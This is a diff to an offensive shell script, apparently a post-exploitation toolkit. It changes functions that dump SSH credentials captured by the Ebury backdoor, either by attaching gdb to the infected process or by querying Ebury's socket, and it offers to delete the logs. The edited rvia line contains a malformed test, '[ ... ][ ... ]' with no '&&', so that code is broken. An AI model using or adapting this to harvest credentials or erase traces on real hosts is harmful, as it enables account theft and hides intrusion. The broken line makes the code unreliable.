@@ -1405,7 +1405,9 @@ _ebcredsoxdump() {
 }
 
 _ebgdborsox() {
-    [ -z "$DEL" ] && command -v gdb >/dev/null && {
+    local pid="${1:?}"
+    local usegdb="${2:-}"
+    [ "$usegdb" = 1 ] && {
         _ebcredgdbdump "$pid"
         return
     }
@@ -1413,9 +1415,10 @@ _ebgdborsox() {
 }
 
 _ebdump() {
-    local s con rvia res pid="${1:?}"
+    local usegdb s con rvia res pid="${1:?}"
 
-    res=$(_ebgdborsox "$pid" | while :; do
+    [ "$UID" -eq 0 ] && [ -z "$DEL" ] && command -v gdb >/dev/null && usegdb=1
+    res=$(_ebgdborsox "$pid" "$usegdb" | while :; do
         read -r s
         [ -z "$s" ] && {
             [ -n "$con" ] && echo -e "#$(( ($(date +%s) - con)/60 )) minutes ago"
@@ -1425,7 +1428,7 @@ _ebdump() {
         [ -z "$con" ] && con=$(echo "$s" | grep -E  $'\te\t1' | cut -f8 -d $'\t')
     done)
     [ -z "$res" ] && { echo -en "${CN}"; return; } #failed. Maybe already ptraced?
-    [ -z "$DEL" ] && command -v gdb >/dev/null && rvia="via gdb [set DEL=1 to delete logs]" || rvia="via @$(_ebsock)"
+    [ "$UID" -eq 0 ][ -z "$DEL" ] && command -v gdb >/dev/null && rvia="via gdb [set DEL=1 to delete logs]" || rvia="via @$(_ebsock)"
     echo -e "${CN}${CDY}Dumping Ebury log ${rvia} (last: $(echo "$res" | grep ^# | sed 's/^.//')):${CF}"
 
     echo "$res" | grep ^: | column -t
